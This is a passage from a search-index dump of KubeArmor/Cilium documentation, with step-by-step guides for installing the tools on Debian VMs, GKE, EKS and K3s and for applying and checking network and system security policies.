/usr/bin/sleep # try sleep 1 action : Block Run this command to apply the policy: karmor vm policy add khp-example-vmname.yaml","title":"Step 8: Apply and Verify Kubearmor system policy"},{"location":"open-source/buster/buster/#step-9-policy-violation","text":"sleep 10 Verifying policy Violation logs: karmor log","title":"Step 9: Policy Violation"},{"location":"open-source/buster/buster/#step-10-apply-and-verify-cilium-network-policy","text":"1. Allow connectivity with the control plane ( and port 2379) cat vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.138.0.5/32 toPorts : - ports : - port : \"2379\" protocol : TCP 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 cat vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP 3. This policy block the DNS access in VM cat vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM cat vm-allow-www-google-co-in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add vm-allow-control-plane.yaml karmor vm --kvms policy add vm-allow-ssh.yaml karmor vm --kvms policy add vm-dns-visibility.yaml karmor vm --kvms policy add vm-allow-www-google-co-in.yaml","title":"Step 10: Apply and Verify Cilium network policy"},{"location":"open-source/buster/buster/#step-11-policy-violation-on-worker-node","text":"curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Step 11: Policy Violation on worker node"},{"location":"open-source/cilium/bullseye/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Cilium on Debian 11 (Bullseye) with 5.10 Kernel Version by applying policies on VM workloads. Step 1: Install etcd in control plane VM \u00b6 sudo apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and Check the status of etcd: sudo service etcd restart sudo service etcd enable sudo service etcd status Step 2: Install KVM-Service in control plane \u00b6 Download the Latest RPM Package wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.deb dpkg -i kvmservice_0.1_linux-amd64.deb systemctl status kvmservice Step 3: Install Karmor in control plane \u00b6 curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Step 4: Onboard VMs using Karmor \u00b6 cat kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command to Add the VMs: karmor vm add kvmpolicy1.yaml To see the onboarded VM\u2019s karmor vm list Step 5: Generate Installation scripts for configured worker VMs \u00b6 Generate VM Installation scripts for the configured VM by running the following command: karmor vm --kvms getscript -v testvm1 Step 6: Execute the Installation script in VMs \u00b6 Note: Docker needs to install before running the script. vi testvm1.sh Comment the following line on the script and save it: #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following command: ./testvm1.sh Note: Make sure the KVM-Service is running on control plane VM & To onboard more worker VM repeat Step 4, Step 5 & Step 6. You can Verify by running following command: sudo docker ps Step 7: Apply and Verify Cilium network policy \u00b6 1. Allow connectivity with the control plane ( and port 2379) cat vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.138.0.5/32 toPorts : - ports : - port : \"2379\" protocol : TCP 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 cat vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP 3. This policy block the DNS access in VM cat vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM cat vm-allow-www.google.co.in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add vm-allow-control-plane.yaml karmor vm --kvms policy add vm-allow-ssh.yaml karmor vm --kvms policy add vm-dns-visibility.yaml karmor vm --kvms policy add vm-allow-www-google-co-in.yaml Step 8: Policy Violation \u00b6 curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Debian 11 (Bullseye)"},{"location":"open-source/cilium/bullseye/#overview","text":"This user journey guides you to install and verify the compatibility of Cilium on Debian 11 (Bullseye) with 5.10 Kernel Version by applying policies on VM workloads.","title":"Overview"},{"location":"open-source/cilium/bullseye/#step-1-install-etcd-in-control-plane-vm","text":"sudo apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and Check the status of etcd: sudo service etcd restart sudo service etcd enable sudo service etcd status","title":"Step 1: Install etcd in control plane VM"},{"location":"open-source/cilium/bullseye/#step-2-install-kvm-service-in-control-plane","text":"Download the Latest RPM Package wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.deb dpkg -i kvmservice_0.1_linux-amd64.deb systemctl status kvmservice","title":"Step 2: Install KVM-Service in control plane"},{"location":"open-source/cilium/bullseye/#step-3-install-karmor-in-control-plane","text":"curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin","title":"Step 3: Install Karmor in control plane"},{"location":"open-source/cilium/bullseye/#step-4-onboard-vms-using-karmor","text":"cat kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command to Add the VMs: karmor vm add kvmpolicy1.yaml To see the onboarded VM\u2019s karmor vm list","title":"Step 4: Onboard VMs using Karmor"},{"location":"open-source/cilium/bullseye/#step-5-generate-installation-scripts-for-configured-worker-vms","text":"Generate VM Installation scripts for the configured VM by running the following command: karmor vm --kvms getscript -v testvm1","title":"Step 5: Generate Installation scripts for configured worker VMs"},{"location":"open-source/cilium/bullseye/#step-6-execute-the-installation-script-in-vms","text":"Note: Docker needs to install before running the script. vi testvm1.sh Comment the following line on the script and save it: #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following command: ./testvm1.sh Note: Make sure the KVM-Service is running on control plane VM & To onboard more worker VM repeat Step 4, Step 5 & Step 6. You can Verify by running following command: sudo docker ps","title":"Step 6: Execute the Installation script in VMs"},{"location":"open-source/cilium/bullseye/#step-7-apply-and-verify-cilium-network-policy","text":"1. Allow connectivity with the control plane ( and port 2379) cat vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.138.0.5/32 toPorts : - ports : - port : \"2379\" protocol : TCP 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 cat vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP 3. This policy block the DNS access in VM cat vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM cat vm-allow-www.google.co.in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add vm-allow-control-plane.yaml karmor vm --kvms policy add vm-allow-ssh.yaml karmor vm --kvms policy add vm-dns-visibility.yaml karmor vm --kvms policy add vm-allow-www-google-co-in.yaml","title":"Step 7: Apply and Verify Cilium network policy"},{"location":"open-source/cilium/bullseye/#step-8-policy-violation","text":"curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Step 8: Policy Violation"},{"location":"open-source/cilium/buster/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Cilium on Debian 10 (Buster) with 4.19 Kernel Version by applying policies on VM workloads. Step 1: Install etcd in control plane VM \u00b6 sudo apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and Check the status of etcd: sudo service etcd restart sudo service etcd status Step 2: Install KVM-Service in control plane \u00b6 Download the Latest deb Package wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.deb dpkg -i kvmservice_0.1_linux-amd64.deb systemctl status kvmservice Step 3: Install Karmor in control plane \u00b6 curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Step 4: Onboard VMs using Karmor \u00b6 cat kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command to Add the VM: karmor vm add kvmpolicy1.yaml To see the onboarded VM\u2019s karmor vm list Step 5: Generate Installation scripts for configured worker VMs \u00b6 Generate VM Installation scripts for the configured VM by running the following command: karmor vm --kvms getscript -v testvm1 Step 6: Execute the Installation script in VMs \u00b6 Install pre-requisites: Docker needs to install before running the script. Comment the following line on the script and save it: vi testvm1.sh #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following command: ./testvm1.sh Note: Make sure the KVM-Service is running on control plane VM & To Onboard more worker VM repeat Step 4, Step 5 & Step 6. You can Verify by running following command: sudo docker ps Step 7: Apply and Verify Cilium network policy \u00b6 1. Allow connectivity with the control plane ( and port 2379) cat vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.138.0.5/32 toPorts : - ports : - port : \"2379\" protocol : TCP 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 cat vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP 3. This policy block the DNS access in VM cat vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM cat vm-allow-www-google-co-in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add vm-allow-control-plane.yaml karmor vm --kvms policy add vm-allow-ssh.yaml karmor vm --kvms policy add vm-dns-visibility.yaml karmor vm --kvms policy add vm-allow-www-google-co-in.yaml Step 8: Policy Violation on worker node \u00b6 curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Debian 10 (Buster)"},{"location":"open-source/cilium/buster/#overview","text":"This user journey guides you to install and verify the compatibility of Cilium on Debian 10 (Buster) with 4.19 Kernel Version by applying policies on VM workloads.","title":"Overview"},{"location":"open-source/cilium/buster/#step-1-install-etcd-in-control-plane-vm","text":"sudo apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and Check the status of etcd: sudo service etcd restart sudo service etcd status","title":"Step 1: Install etcd in control plane VM"},{"location":"open-source/cilium/buster/#step-2-install-kvm-service-in-control-plane","text":"Download the Latest deb Package wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.deb dpkg -i kvmservice_0.1_linux-amd64.deb systemctl status kvmservice","title":"Step 2: Install KVM-Service in control plane"},{"location":"open-source/cilium/buster/#step-3-install-karmor-in-control-plane","text":"curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin","title":"Step 3: Install Karmor in control plane"},{"location":"open-source/cilium/buster/#step-4-onboard-vms-using-karmor","text":"cat kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command to Add the VM: karmor vm add kvmpolicy1.yaml To see the onboarded VM\u2019s karmor vm list","title":"Step 4: Onboard VMs using Karmor"},{"location":"open-source/cilium/buster/#step-5-generate-installation-scripts-for-configured-worker-vms","text":"Generate VM Installation scripts for the configured VM by running the following command: karmor vm --kvms getscript -v testvm1","title":"Step 5: Generate Installation scripts for configured worker VMs"},{"location":"open-source/cilium/buster/#step-6-execute-the-installation-script-in-vms","text":"Install pre-requisites: Docker needs to install before running the script. Comment the following line on the script and save it: vi testvm1.sh #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following command: ./testvm1.sh Note: Make sure the KVM-Service is running on control plane VM & To Onboard more worker VM repeat Step 4, Step 5 & Step 6. You can Verify by running following command: sudo docker ps","title":"Step 6: Execute the Installation script in VMs"},{"location":"open-source/cilium/buster/#step-7-apply-and-verify-cilium-network-policy","text":"1. Allow connectivity with the control plane ( and port 2379) cat vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.138.0.5/32 toPorts : - ports : - port : \"2379\" protocol : TCP 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 cat vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP 3. This policy block the DNS access in VM cat vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM cat vm-allow-www-google-co-in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add vm-allow-control-plane.yaml karmor vm --kvms policy add vm-allow-ssh.yaml karmor vm --kvms policy add vm-dns-visibility.yaml karmor vm --kvms policy add vm-allow-www-google-co-in.yaml","title":"Step 7: Apply and Verify Cilium network policy"},{"location":"open-source/cilium/buster/#step-8-policy-violation-on-worker-node","text":"curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Step 8: Policy Violation on worker node"},{"location":"open-source/cilium/cos/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Cilium on GKE with COS and Ubuntu by applying policies on Kubernetes workloads. Step 1: Install Daemonsets & Services \u00b6 curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash Note: This will Install all the components. Step 2: Verify the Installation \u00b6 Kubectl get pods -A Step 3: Install sample K8's Application \u00b6 kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml Step 4: Verify the Installation \u00b6 kubectl get pods -n wordpress-mysql Step 5: Get Auto discovered policies \u00b6 curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash Step 6: Applying Auto discovered policies on Cluster \u00b6 These policies can then be applied on the k8s cluster running Cilium . Auto-discovery-policy service will audit the process and network and will give policies to allow only those processes and network. Apply Cilium policy: kubectl apply -f cilium_policies.yaml To list applied policies, kubectl get ksp,cnp -A To uninstall all the services Installed: curl -s https://raw.githubusercontent.com/accuknox/tools/main/uninstall.sh | bash kubectl delete -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml","title":"GKE with COS and Ubuntu"},{"location":"open-source/cilium/cos/#overview","text":"This user journey guides you to install and verify the compatibility of Cilium on GKE with COS and Ubuntu by applying policies on Kubernetes workloads.","title":"Overview"},{"location":"open-source/cilium/cos/#step-1-install-daemonsets-services","text":"curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash Note: This will Install all the components.","title":"Step 1: Install Daemonsets &amp; Services"},{"location":"open-source/cilium/cos/#step-2-verify-the-installation","text":"Kubectl get pods -A","title":"Step 2: Verify the Installation"},{"location":"open-source/cilium/cos/#step-3-install-sample-k8s-application","text":"kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml","title":"Step 3: Install sample K8's Application"},{"location":"open-source/cilium/cos/#step-4-verify-the-installation","text":"kubectl get pods -n wordpress-mysql","title":"Step 4: Verify the Installation"},{"location":"open-source/cilium/cos/#step-5-get-auto-discovered-policies","text":"curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash","title":"Step 5: Get Auto discovered policies"},{"location":"open-source/cilium/cos/#step-6-applying-auto-discovered-policies-on-cluster","text":"These policies can then be applied on the k8s cluster running Cilium . Auto-discovery-policy service will audit the process and network and will give policies to allow only those processes and network. Apply Cilium policy: kubectl apply -f cilium_policies.yaml To list applied policies, kubectl get ksp,cnp -A To uninstall all the services Installed: curl -s https://raw.githubusercontent.com/accuknox/tools/main/uninstall.sh | bash kubectl delete -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml","title":"Step 6: Applying Auto discovered policies on Cluster"},{"location":"open-source/cilium/eks/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Cilium on EKS Ubuntu Server 20.04 by applying policies on Kubernetes workloads. Step 1: Create a EKS Cluster \u00b6 Install EKS CTL , AWS CLI , Helm tools cat eks-config.yaml apiVersion : eksctl.io/v1alpha5 kind : ClusterConfig metadata : name : eks-ubuntu-cluster region : us-east-2 nodeGroups : - name : ng-1 instanceType : c5a.xlarge amiFamily : \"Ubuntu2004\" desiredCapacity : 1 volumeSize : 80 ssh : allow : true preBootstrapCommands : - \"sudo apt install linux-headers-$(uname -r)\" Official Link: Sample eks-config.yaml Note: EKS suported image types: Amazon Linux 2 Ubuntu 20.04 Ubuntu 18.04 Bottlerocket Windows Server 2019 Core Container Windows Server 2019 Full Container Windows Server 2004 Core Container Windows Server 20H2 Core Container eksctl create cluster -f eks-config.yaml aws eks --region us-east-2 update-kubeconfig --name eks-ubuntu-cluster Step 2: Cilium Install \u00b6 curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install Cilium Verify: kubectl get pods -n kube-system | grep cilium Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble Step 3: Cilium Policy \u00b6 1. Create a tightfighter and deathstart deployment cat tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels 2. Explore the policy cat sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-ingress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : deathstar ingress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" 3. Apply the policy kubectl apply -f sample-cilium-ingress-policy.yaml 4. Policy violation kubectl get svc kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.255.199/v1/request-landing kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.255.199/v1/bye 5. Cilium SVC port forward to Monitor the logs cilium hubble port-forward 6. Monitoring the Cilium Violation logs hubble observe -f --protocol http --pod tiefighter","title":"EKS Ubuntu Server 20.04"},{"location":"open-source/cilium/eks/#overview","text":"This user journey guides you to install and verify the compatibility of Cilium on EKS Ubuntu Server 20.04 by applying policies on Kubernetes workloads.","title":"Overview"},{"location":"open-source/cilium/eks/#step-1-create-a-eks-cluster","text":"Install EKS CTL , AWS CLI , Helm tools cat eks-config.yaml apiVersion : eksctl.io/v1alpha5 kind : ClusterConfig metadata : name : eks-ubuntu-cluster region : us-east-2 nodeGroups : - name : ng-1 instanceType : c5a.xlarge amiFamily : \"Ubuntu2004\" desiredCapacity : 1 volumeSize : 80 ssh : allow : true preBootstrapCommands : - \"sudo apt install linux-headers-$(uname -r)\" Official Link: Sample eks-config.yaml Note: EKS suported image types: Amazon Linux 2 Ubuntu 20.04 Ubuntu 18.04 Bottlerocket Windows Server 2019 Core Container Windows Server 2019 Full Container Windows Server 2004 Core Container Windows Server 20H2 Core Container eksctl create cluster -f eks-config.yaml aws eks --region us-east-2 update-kubeconfig --name eks-ubuntu-cluster","title":"Step 1: Create a EKS Cluster"},{"location":"open-source/cilium/eks/#step-2-cilium-install","text":"curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install Cilium Verify: kubectl get pods -n kube-system | grep cilium Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble","title":"Step 2: Cilium Install"},{"location":"open-source/cilium/eks/#step-3-cilium-policy","text":"1. Create a tightfighter and deathstart deployment cat tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels 2. Explore the policy cat sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-ingress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : deathstar ingress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" 3. Apply the policy kubectl apply -f sample-cilium-ingress-policy.yaml 4. Policy violation kubectl get svc kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.255.199/v1/request-landing kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.255.199/v1/bye 5. Cilium SVC port forward to Monitor the logs cilium hubble port-forward 6. Monitoring the Cilium Violation logs hubble observe -f --protocol http --pod tiefighter","title":"Step 3: Cilium Policy"},{"location":"open-source/cilium/k3s/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Cilium on K3's by applying policies on Kubernetes workloads. Step 1: Install K3's on Linux \u00b6 curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC = '--flannel-backend=none --disable traefik' sh -s - --write-kubeconfig-mode 644 export KUBECONFIG = /etc/rancher/k3s/k3s.yaml cp /etc/rancher/k3s/k3s.yaml ~/.kube/config systemctl status k3s which kubectl ; kubectl get nodes Step 2: Install Cilium \u00b6 curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin ; rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install Cilium Verify kubectl get pods -n kube-system | grep cilium Cilium Hubble Enable cilium hubble enable Cilium Hubble Verify kubectl get pods -n kube-system | grep hubble Step 3: Cilium Policy \u00b6 3.1: Create a tightfighter & deathstart deployment vim tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- 